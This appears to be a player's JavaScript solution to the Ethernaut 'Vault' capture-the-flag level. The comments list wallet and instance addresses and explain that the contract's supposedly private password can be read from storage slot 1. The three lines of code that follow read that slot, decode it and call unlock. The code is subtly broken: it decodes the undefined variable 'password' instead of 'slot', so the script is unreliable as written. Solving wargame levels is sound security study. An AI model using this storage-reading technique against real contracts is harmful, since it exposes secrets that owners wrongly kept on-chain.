// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x6dd276422c8A3Cf06a9A9912d73E45e1A613cDac

// solution

// look into the transaction that created the contract to see the input data that was sent (using etherscan)

// or because of how eth manage the storage, you can know that the "password" variable will be stored ath the beginning of the second slot (index 1)
// because it occupies an entire slot of storage (32 bytes)

const slot = await web3.eth.getStorageAt(contract.address, 1);

const password = web3.utils.hexToAscii(password); // 'A very strong secret password :)'

await contract.unlock(web3.utils.stringToHex(password));